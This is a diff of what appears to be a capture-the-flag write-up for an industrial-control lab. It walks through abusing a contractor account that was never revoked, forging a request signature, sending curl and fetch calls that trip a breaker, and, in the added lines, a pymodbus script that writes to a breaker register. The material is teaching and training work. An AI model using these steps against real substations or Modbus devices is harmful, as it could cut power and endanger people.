@@ -76,45 +76,23 @@ Industrial facilities often run secondary web servers for internal documentation
 <img width="1012" height="945" alt="image" src="https://github.com/user-attachments/assets/6d439944-9a58-4003-903f-37a88f0865cb" />
 
 
-   * A valid work order reference: `"work_order": "882"`.
-   * A command authorization signature in the `X-Signature` header, computed as the SHA-256 hash of the string `username:work_order:password`.
-     For this exercise, the signature input is `contractor_maint:882:Welcome123`. You can generate this hash using:
-      ```bash
-      echo -n "contractor_maint:882:Welcome123" | sha256sum
-      # Output: 277ad8b1281db20d186c03077437d8d49042ee1e3b67b36d83277949820bb554
-      ```
    
-   Dispatch a POST request to `/api/breaker/trip` with the contractor session, work order payload, and command signature header:
-   * **Via Developer Tools Console (in browser):**
-     Open the Developer Tools (F12) Console on the restricted page, and execute:
-     ```javascript
-     fetch('/api/breaker/trip', {
-         method: 'POST',
-         headers: { 
-             'Content-Type': 'application/json',
-             'X-Signature': '277ad8b1281db20d186c03077437d8d49042ee1e3b67b36d83277949820bb554'
-         },
-         body: JSON.stringify({ work_order: '882' })
-     }).then(r => r.json()).then(console.log);
-     ```
-   * **Via Command Line (cURL):**
-     ```bash
-      # Authenticate and save session
-      curl -c cookies.txt -d "username=contractor_maint&password=Welcome123" http://<Target-IP>:10008/
-      # Dispatch command with work_order validation payload and signature header
-      curl -b cookies.txt \
-           -H "Content-Type: application/json" \
-           -H "X-Signature: 277ad8b1281db20d186c03077437d8d49042ee1e3b67b36d83277949820bb554" \
-           -d '{"work_order":"882"}' \
-           -X POST http://<Target-IP>:10008/api/breaker/trip
-     ```
-6. This sends a live Modbus control instruction to write `0` to the breaker register.
-7. Reload the `/Substation_High_Voltage_Feeder` page in your browser or perform a GET request with curl. The schematic will update dynamically (turning the line status indicator red/OFF) and display the recovered flag:
-   `FLAG{contractor_access_not_revoked_9a38f}`
+Step 5: Execute OT Payload via Modbus TCP
+Send the command directly to the Modbus gateway to trip breaker CB-301 by writing value 0 to Holding Register 4:
 
----
+Bash
+from pymodbus.client import ModbusTcpClient
 
-## MITRE ATT&CK for ICS Mapping
-* **Tactic:** TA0110 (Persistence) / TA0109 (Lateral Movement)
-* **Technique:** T0859 (Valid Accounts)
-  * *Description:* Leveraging credentials of a closed contractor account left active in the IAM database to bypass security boundaries and access process schematics.
+client = ModbusTcpClient('127.0.0.1', port=5020)
+client.connect()
+
+# Write '0' (Open/Trip) to holding register 4 (Breaker CB-301 Control)
+client.write_register(4, 0)
+client.close()
+print("Breaker CB-301 tripped!")
+
+
+<img width="263" height="18" alt="image" src="https://github.com/user-attachments/assets/cd9ca95d-3958-44e2-a04d-b52594668120" />
+
+
+
